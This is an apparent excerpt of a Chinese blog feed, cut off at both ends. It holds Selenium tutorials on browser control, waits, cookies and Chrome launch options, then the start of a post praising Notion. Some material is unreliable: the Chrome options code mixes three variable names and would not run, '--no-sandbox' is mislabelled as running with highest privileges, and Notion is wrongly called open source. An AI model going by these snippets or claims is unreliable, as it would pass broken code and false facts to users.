title="控制浏览器操作"></a>控制浏览器操作</h2><ul><li>  控制浏览器窗口大小</li></ul><p><code>driver.set_window_size(480, 800)</code></p><ul><li>  浏览器后退，前进</li></ul><p><code># 后退 driver.back()</code></p><p><code># 前进 driver.forward()</code></p><ul><li>  刷新</li></ul><p><code>driver.refresh() # 刷新</code></p><h2 id="Webelement-常用方法"><a href="#Webelement-常用方法" class="headerlink" title="Webelement 常用方法"></a>Webelement 常用方法</h2><ul><li>  点击和输入</li></ul><p><code>driver.find_element_by_id(&quot;kw&quot;).clear() # 清楚文本 driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;selenium&quot;) # 模拟按键输入 driver.find_element_by_id(&quot;su&quot;).click() # 单机元素</code></p><ul><li>  提交</li></ul><p>可以在搜索框模拟回车操作</p><p><code>search_text = driver.find_element_by_id(&#39;kw&#39;) search_text.send_keys(&#39;selenium&#39;) search_text.submit()</code></p><ul><li>  其他</li></ul><p>size： 返回元素的尺寸。</p><p>text： 获取元素的文本。</p><p>get_attribute(name)： 获得属性值。</p><p>is_displayed()： 设置该元素是否用户可见。</p><h2 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h2><p>在 WebDriver 中， 将这些关于鼠标操作的方法封装在 ActionChains 类提供。</p><p>ActionChains 类提供了鼠标操作的常用方法：</p><ul><li>  perform()： 执行所有 ActionChains 中存储的行为；</li><li>  context_click()： 右击；</li><li>  double_click()： 双击；</li><li>  drag_and_drop()： 拖动；</li><li>  move_to_element()： 鼠标悬停。</li></ul><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"># 引入 ActionChains 类</span><br><span class="line">from selenium.webdriver.common.action_chains import ActionChains</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(&quot;https://www.baidu.cn&quot;)</span><br><span class="line"></span><br><span class="line"># 定位到要悬停的元素</span><br><span class="line">above = driver.find_element_by_link_text(&quot;设置&quot;)</span><br><span class="line"># 对定位到的元素执行鼠标悬停操作</span><br><span class="line">ActionChains(driver).move_to_element(above).perform()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h2><p>以下为常用的键盘操作：</p><ul><li>  send_keys(Keys.BACK_SPACE) 删除键（BackSpace）</li><li>  send_keys(Keys.SPACE) 空格键 (Space)</li><li>  send_keys(Keys.TAB) 制表键 (Tab)</li><li>  send_keys(Keys.ESCAPE) 回退键（Esc）</li><li>  send_keys(Keys.ENTER) 回车键（Enter）</li><li>  send_keys(Keys.CONTROL,’a’) 全选（Ctrl+A）</li><li>  send_keys(Keys.CONTROL,’c’) 复制（Ctrl+C）</li><li>  send_keys(Keys.CONTROL,’x’) 剪切（Ctrl+X）</li><li>  send_keys(Keys.CONTROL,’v’) 粘贴（Ctrl+V）</li><li>  send_keys(Keys.F1) 键盘 F1</li><li>  ……</li><li>  send_keys(Keys.F12) 键盘 F12</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 输入框输入内容</span><br><span class="line">driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;seleniumm&quot;)</span><br><span class="line"></span><br><span class="line"># 删除多输入的一个 m</span><br><span class="line">driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.BACK_SPACE)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="获取断言信息"><a href="#获取断言信息" class="headerlink" title="获取断言信息"></a>获取断言信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title = driver.title # 打印当前页面title</span><br><span class="line">now_url = driver.current_url # 打印当前页面URL</span><br><span class="line">user = driver.find_element_by_class_name(&#x27;nums&#x27;).text # # 获取结果数目</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="等待页面加载完成"><a href="#等待页面加载完成" class="headerlink" title="等待页面加载完成"></a>等待页面加载完成</h2><ul><li>  <strong>显示等待</strong></li></ul><p>显式等待使 WebdDriver 等待某个条件成立时继续执行，否则在达到最大时长时抛出超时异常（TimeoutException）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line"></span><br><span class="line">element = WebDriverWait(driver, 5, 0.5).until(</span><br><span class="line">                      EC.presence_of_element_located((By.ID, &quot;kw&quot;))</span><br><span class="line">                      )</span><br><span class="line">element.send_keys(&#x27;selenium&#x27;)</span><br><span class="line">driver.quit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>WebDriverWait 类是由 WebDirver 提供的等待方法。在设置时间内，默认每隔一段时间检测一次当前页面元素是否存在，如果超过设置时间检测不到则抛出异常。具体格式如下：</p><p><code>WebDriverWait(driver, timeout, poll_frequency=0.5, ignored_exceptions=None)</code></p><ul><li>  driver ：浏览器驱动。</li><li>  timeout ：最长超时时间，默认以秒为单位。</li><li>  poll_frequency ：检测的间隔（步长）时间，默认为 0.5S。</li><li>ignored_exceptions ：超时后的异常信息，默认情况下抛 NoSuchElementException 异常。  </li><li>WebDriverWait() 一般由 until() 或 until_not() 方法配合使用，下面是 until() 和 until_not() 方法的说明。  </li><li>until(method, message=‘’) 调用该方法提供的驱动程序作为一个参数，直到返回值为 True。  </li><li>until_not(method, message=‘’) 调用该方法提供的驱动程序作为一个参数，直到返回值为 False。  </li></ul><p>在本例中，通过 as 关键字将 expected_conditions 重命名为 EC，并调用 presence_of_element_located() 方法判断元素是否存在。</p><ul><li>  <strong>隐式等待</strong></li></ul><p>如果某些元素不是立即可用的，隐式等待是告诉 WebDriver 去等待一定的时间后去查找元素。 默认等待时间是 0 秒，一旦设置该值，隐式等待是设置该 WebDriver 的实例的生命周期。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">driver = webdriver.Firefox()    </span><br><span class="line">driver.implicitly_wait(10) # seconds    </span><br><span class="line">driver.get(&quot;http://somedomain/url_that_delays_loading&quot;)    </span><br><span class="line">myDynamicElement = driver.find_element_by_id(&quot;myDynamicElement&quot;) </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="在不同的窗口和框架之间移动"><a href="#在不同的窗口和框架之间移动" class="headerlink" title="在不同的窗口和框架之间移动"></a>在不同的窗口和框架之间移动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver.switch_to_window(&quot;windowName&quot;)</span><br><span class="line">driver.switch_to_frame(&quot;frameName&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以直接取表单的 id 或 name 属性。如果 iframe 没有可用的 id 和 name 属性，则可以通过下面的方式进行定位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#先通过xpth定位到iframe</span><br><span class="line">xf = driver.find_element_by_xpath(&#x27;//*[@id=&quot;x-URS-iframe&quot;]&#x27;)</span><br><span class="line"></span><br><span class="line">#再将定位对象传给switch_to_frame()方法</span><br><span class="line">driver.switch_to_frame(xf)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一旦我们完成了 frame 中的工作，我们可以这样返回父 frame:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.switch_to_default_content()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="警告框处理"><a href="#警告框处理" class="headerlink" title="警告框处理"></a>警告框处理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert = driver.switch_to_alert()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>  text：返回 alert/confirm/prompt 中的文字信息。</li><li>  accept()：接受现有警告框。</li><li>  dismiss()：解散现有警告框。</li><li>  send_keys(keysToSend)：发送文本至警告框。keysToSend：将文本发送至警告框。</li></ul><h2 id="下拉框选择"><a href="#下拉框选择" class="headerlink" title="下拉框选择"></a>下拉框选择</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.support.select import Select</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.implicitly_wait(10)</span><br><span class="line">driver.get(&#x27;http://www.baidu.com&#x27;)</span><br><span class="line">sel = driver.find_element_by_xpath(&quot;//select[@id=&#x27;nr&#x27;]&quot;)</span><br><span class="line">Select(sel).select_by_value(&#x27;50&#x27;)  # 显示50条</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_name(&quot;file&quot;).send_keys(&#x27;D:\\upload_file.txt&#x27;)  # # 定位上传按钮，添加本地文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="cookie-操作"><a href="#cookie-操作" class="headerlink" title="cookie 操作"></a>cookie 操作</h2><p>WebDriver 操作 cookie 的方法：</p><ul><li>  get_cookies()： 获得所有 cookie 信息。</li><li>  get_cookie(name)： 返回字典的 key 为 “name” 的 cookie 信息。</li><li>  add_cookie(cookie_dict) ： 添加 cookie。“cookie_dict” 指字典对象，必须有 name 和 value 值。</li><li>  delete_cookie(name,optionsString)：删除 cookie 信息。“name” 是要删除的 cookie 的名称，“optionsString” 是该 cookie 的选项，目前支持的选项包括 “路径”，“域”。</li><li>  delete_all_cookies()： 删除所有 cookie 信息</li></ul><h2 id="调用-JavaScript-代码"><a href="#调用-JavaScript-代码" class="headerlink" title="调用 JavaScript 代码"></a>调用 JavaScript 代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">js=&quot;window.scrollTo(100,450);&quot;</span><br><span class="line">driver.execute_script(js) # 通过javascript设置浏览器窗口的滚动条位置</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过 execute_script() 方法执行 JavaScripts 代码来移动滚动条的位置。</p><h2 id="窗口截图"><a href="#窗口截图" class="headerlink" title="窗口截图"></a>窗口截图</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.get_screenshot_as_file(&quot;D:\\baidu_img.jpg&quot;) # 截取当前窗口，并指定截图图片的保存位置</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="关闭浏览器"><a href="#关闭浏览器" class="headerlink" title="关闭浏览器"></a>关闭浏览器</h2><ul><li>  close() 关闭单个窗口</li><li>  quit() 关闭所有窗口</li></ul><h2 id="直接用-cookie-登录方法"><a href="#直接用-cookie-登录方法" class="headerlink" title="直接用 cookie 登录方法"></a>直接用 cookie 登录方法</h2><p>链接：<a href="https://www.jianshu.com/p/773c58406bdb">https://www.jianshu.com/p/773c58406bdb</a></p><ol><li> 手动获取网页的 cookie，将其序列化并存储在本地</li><li> 写入代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for item in cookies:</span><br><span class="line">    driver.add_cookie(item)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考链接：</p><ol><li> <a href="http://www.testclass.net/selenium_python">http://www.testclass.net/selenium_python</a></li><li> <a href="https://selenium-python-zh.readthedocs.io/en/latest/index.html">https://selenium-python-zh.readthedocs.io/en/latest/index.html</a></li></ol><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 软件测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>selenium启动chrome配置参数问题</title>
      <link href="/2022/06/06/selenium%20%E5%90%AF%E5%8A%A8%20Chrome%20%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98/"/>
      <url>/2022/06/06/selenium%20%E5%90%AF%E5%8A%A8%20Chrome%20%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>每次当 selenium 启动 chrome 浏览器的时候，chrome 浏览器很干净，没有插件、没有收藏、没有历史记录，这是因为 selenium 在启动 chrome 时为了保证最快的运行效率，启动了一个裸浏览器，这就是为什么需要配置参数的原因，但是有些时候我们需要的不仅是一个裸浏览器。  </p><p>selenium 启动配置参数接收是 ChromeOptions 类，创建方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">option = webdriver.ChromeOptions()</span><br></pre></td></tr></table></figure><p>创建了 ChromeOptions 类之后就是添加参数，添加参数有几个特定的方法，分别对应添加不同类型的配置项目。</p><p>设置 chrome 二进制文件位置 (binary_location)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">option = webdriver.ChromeOptions()</span><br><span class="line"></span><br><span class="line"># 添加启动参数</span><br><span class="line">option.add_argument()</span><br><span class="line"></span><br><span class="line"># 添加扩展应用 </span><br><span class="line">option.add_extension()</span><br><span class="line">option.add_encoded_extension()</span><br><span class="line"></span><br><span class="line"># 添加实验性质的设置参数 </span><br><span class="line">option.add_experimental_option()</span><br><span class="line"></span><br><span class="line"># 设置调试器地址</span><br><span class="line">option.debugger_address()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>常用配置参数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">option = webdriver.ChromeOptions()</span><br><span class="line"></span><br><span class="line"># 添加UA</span><br><span class="line">options.add_argument(&#x27;user-agent=&quot;MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1&quot;&#x27;)</span><br><span class="line"></span><br><span class="line"># 指定浏览器分辨率</span><br><span class="line">options.add_argument(&#x27;window-size=1920x3000&#x27;) </span><br><span class="line"></span><br><span class="line"># 谷歌文档提到需要加上这个属性来规避bug</span><br><span class="line">chrome_options.add_argument(&#x27;--disable-gpu&#x27;) </span><br><span class="line"></span><br><span class="line"> # 隐藏滚动条, 应对一些特殊页面</span><br><span class="line">options.add_argument(&#x27;--hide-scrollbars&#x27;)</span><br><span class="line"></span><br><span class="line"># 不加载图片, 提升速度</span><br><span class="line">options.add_argument(&#x27;blink-settings=imagesEnabled=false&#x27;) </span><br><span class="line"></span><br><span class="line"># 浏览器不提供可视化页面. linux下如果系统不支持可视化不加这条会启动失败</span><br><span class="line">options.add_argument(&#x27;--headless&#x27;) </span><br><span class="line"></span><br><span class="line"># 以最高权限运行</span><br><span class="line">options.add_argument(&#x27;--no-sandbox&#x27;)</span><br><span class="line"></span><br><span class="line"># 手动指定使用的浏览器位置</span><br><span class="line">options.binary_location = r&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; </span><br><span class="line"></span><br><span class="line">#添加crx插件</span><br><span class="line">option.add_extension(&#x27;d:\crx\AdBlock_v2.17.crx&#x27;) </span><br><span class="line"></span><br><span class="line"># 禁用JavaScript</span><br><span class="line">option.add_argument(&quot;--disable-javascript&quot;) </span><br><span class="line"></span><br><span class="line"># 设置开发者模式启动，该模式下webdriver属性为正常值</span><br><span class="line">options.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;]) </span><br><span class="line"></span><br><span class="line"># 禁用浏览器弹窗</span><br><span class="line">prefs = &#123;  </span><br><span class="line">    &#x27;profile.default_content_setting_values&#x27; :  &#123;  </span><br><span class="line">        &#x27;notifications&#x27; : 2  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">options.add_experimental_option(&#x27;prefs&#x27;,prefs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver=webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>浏览器地址栏参数：</strong></p><p>在浏览器地址栏输入下列命令得到相应的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">about:version - 显示当前版本</span><br><span class="line"></span><br><span class="line">　　about:memory - 显示本机浏览器内存使用状况</span><br><span class="line"></span><br><span class="line">　　about:plugins - 显示已安装插件</span><br><span class="line"></span><br><span class="line">　　about:histograms - 显示历史记录</span><br><span class="line"></span><br><span class="line">　　about:dns - 显示DNS状态</span><br><span class="line"></span><br><span class="line">　　about:cache - 显示缓存页面</span><br><span class="line"></span><br><span class="line">　　about:gpu -是否有硬件加速</span><br><span class="line"></span><br><span class="line">　　chrome://extensions/ - 查看已经安装的扩展</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其他配置项目参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">–user-data-dir=”[PATH]” </span><br><span class="line"># 指定用户文件夹User Data路径，可以把书签这样的用户数据保存在系统分区以外的分区</span><br><span class="line"></span><br><span class="line">　　–disk-cache-dir=”[PATH]“ </span><br><span class="line"># 指定缓存Cache路径</span><br><span class="line"></span><br><span class="line">　　–disk-cache-size= </span><br><span class="line"># 指定Cache大小，单位Byte</span><br><span class="line"></span><br><span class="line">　　–first run </span><br><span class="line"># 重置到初始状态，第一次运行</span><br><span class="line"></span><br><span class="line">　　–incognito </span><br><span class="line"># 隐身模式启动</span><br><span class="line"></span><br><span class="line">　　–disable-javascript </span><br><span class="line"># 禁用Javascript</span><br><span class="line"></span><br><span class="line">　　--omnibox-popup-count=&quot;num&quot; </span><br><span class="line"># 将地址栏弹出的提示菜单数量改为num个</span><br><span class="line"></span><br><span class="line">　　--user-agent=&quot;xxxxxxxx&quot; </span><br><span class="line"># 修改HTTP请求头部的Agent字符串，可以通过about:version页面查看修改效果</span><br><span class="line"></span><br><span class="line">　　--disable-plugins </span><br><span class="line"># 禁止加载所有插件，可以增加速度。可以通过about:plugins页面查看效果</span><br><span class="line"></span><br><span class="line">　　--disable-javascript </span><br><span class="line"># 禁用JavaScript，如果觉得速度慢在加上这个</span><br><span class="line"></span><br><span class="line">　　--disable-java </span><br><span class="line"># 禁用java</span><br><span class="line"></span><br><span class="line">　　--start-maximized </span><br><span class="line"># 启动就最大化</span><br><span class="line"></span><br><span class="line">　　--no-sandbox </span><br><span class="line"># 取消沙盒模式</span><br><span class="line"></span><br><span class="line">　　--single-process </span><br><span class="line"># 单进程运行</span><br><span class="line"></span><br><span class="line">　　--process-per-tab </span><br><span class="line"># 每个标签使用单独进程</span><br><span class="line"></span><br><span class="line">　　--process-per-site </span><br><span class="line"># 每个站点使用单独进程</span><br><span class="line"></span><br><span class="line">　　--in-process-plugins </span><br><span class="line"># 插件不启用单独进程</span><br><span class="line"></span><br><span class="line">　　--disable-popup-blocking </span><br><span class="line"># 禁用弹出拦截</span><br><span class="line"></span><br><span class="line">　　--disable-plugins </span><br><span class="line"># 禁用插件</span><br><span class="line"></span><br><span class="line">　　--disable-images </span><br><span class="line"># 禁用图像</span><br><span class="line"></span><br><span class="line">　　--incognito </span><br><span class="line"># 启动进入隐身模式</span><br><span class="line"></span><br><span class="line">　　--enable-udd-profiles </span><br><span class="line"># 启用账户切换菜单</span><br><span class="line"></span><br><span class="line">　　--proxy-pac-url </span><br><span class="line"># 使用pac代理 [via 1/2]</span><br><span class="line"></span><br><span class="line">　　--lang=zh-CN </span><br><span class="line"># 设置语言为简体中文</span><br><span class="line"></span><br><span class="line">　　--disk-cache-dir </span><br><span class="line"># 自定义缓存目录</span><br><span class="line"></span><br><span class="line">　　--disk-cache-size </span><br><span class="line"># 自定义缓存最大值（单位byte）</span><br><span class="line"></span><br><span class="line">　　--media-cache-size </span><br><span class="line"># 自定义多媒体缓存最大值（单位byte）</span><br><span class="line"></span><br><span class="line">　　--bookmark-menu </span><br><span class="line"># 在工具 栏增加一个书签按钮</span><br><span class="line"></span><br><span class="line">　　--enable-sync </span><br><span class="line"># 启用书签同步</span><br><span class="line"></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 软件测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用notion作为日常工作流</title>
      <link href="/2022/01/25/%E4%BD%BF%E7%94%A8notion%E9%AB%98%E6%95%88%E7%AE%A1%E7%90%86%E8%87%AA%E6%88%91%20/"/>
      <url>/2022/01/25/%E4%BD%BF%E7%94%A8notion%E9%AB%98%E6%95%88%E7%AE%A1%E7%90%86%E8%87%AA%E6%88%91%20/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么选择notion（why）"><a href="#为什么选择notion（why）" class="headerlink" title="为什么选择notion（why）"></a>为什么选择notion（why）</h2><h3 id="onenote的缺点"><a href="#onenote的缺点" class="headerlink" title="onenote的缺点"></a>onenote的缺点</h3><p>还没接触notion之前使用onenote作为主力笔记软件，然而onenote缺点太明显了：</p><ol><li>界面UI实在太“微软”了，我个人很不喜欢；</li><li>作为一种富文本笔记软件，颇有让人感觉使用word写笔记一样，样式限制很死，同时对多设备下协同并不是那么完美；</li><li>支持的插件太少了，而且功能很难用，就是跳不出那种条条框框给人耳目一新的感觉；</li></ol><h3 id="all-in-one-notion"><a href="#all-in-one-notion" class="headerlink" title="all in one notion"></a>all in one notion</h3><p>接触notion后我完全爱上这个免费开源的软件了，我用这个工具根据我的需求构建了我日常使用场景：</p><ol><li>mac+ipad+phone</li><li>phone+pocket+notion</li><li>chrome+notion插件+notion</li></ol><h2 id="notion是什么样的软件（what）"><a href="#notion是什么样的软件（what）" class="headerlink" title="notion是什么样的软件（what）"></a>notion是什么样的软件（what）</h2><p>在我看来，它可以作为你全部日常生活和工作的统一调度中心</p><h3 id="notion优点："><a href="#notion优点：" class="headerlink" title="notion优点："></a>notion优点：</h3><ol><li>他是一款使用markdown的软件，对于格式兼容友好很多，反正现在就是很讨厌word这些富文本；</li><li>里面有很多模版可以直接套用，也可以参考自己的使用自己随心所欲创建一个模版；</li><li>它也可以使用于项目管理，支持多人协同，在我看来跟飞书差不多而且优于飞书；</li><li>样式组件也很多，可以自行谷歌；</li><li>最关键是免费！</li></ol><h2 id="我是怎么使用notion实现高效的自我管理"><a href="#我是怎么使用notion实现高效的自我管理" class="headerlink" title="我是怎么使用notion实现高效的自我管理"></a>我是怎么使用notion实现高效的自我管理</h2><h3 id="mac-ipad-phone"><a href="#mac-ipad-phone" class="headerlink" title="mac+ipad+phone"></a>mac+ipad+phone</h3><p>首先我主要使用mac上常开，使用mac占用我大多时间，iPad和phone上作为移动端上同步协同，主要强调是便携灵活，mac端和移动端都安装了notion，notion国内使用不用梯子，速度也很快</p><h3 id="chrome-notion插件-notion"><a href="#chrome-notion插件-notion" class="headerlink" title="chrome+notion插件+notion"></a>chrome+notion插件+notion</h3><p>首先我chrome上装了notion插件，notion也创建了可以同步浏览器的database，每次我看技术文档这些或者看到一半需要跳到其他活，或者我觉这个写得很好可以给我带来素材思路启发就收藏加上tips，我称其为idea，为了能将我每时每刻的idea都能随时记录下来，日后可以在这个database上考虑是否可以实现，从而进行排期实现，我的想法就能马上实现，随时行动实现，我称为敏捷性。</p><p>1，当我浏览到一个网页很喜欢，点击插件同步到我的notion database</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022012513.png" alt="2022012513"></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220125.png" alt="20220125"></p><p>2，我的notion 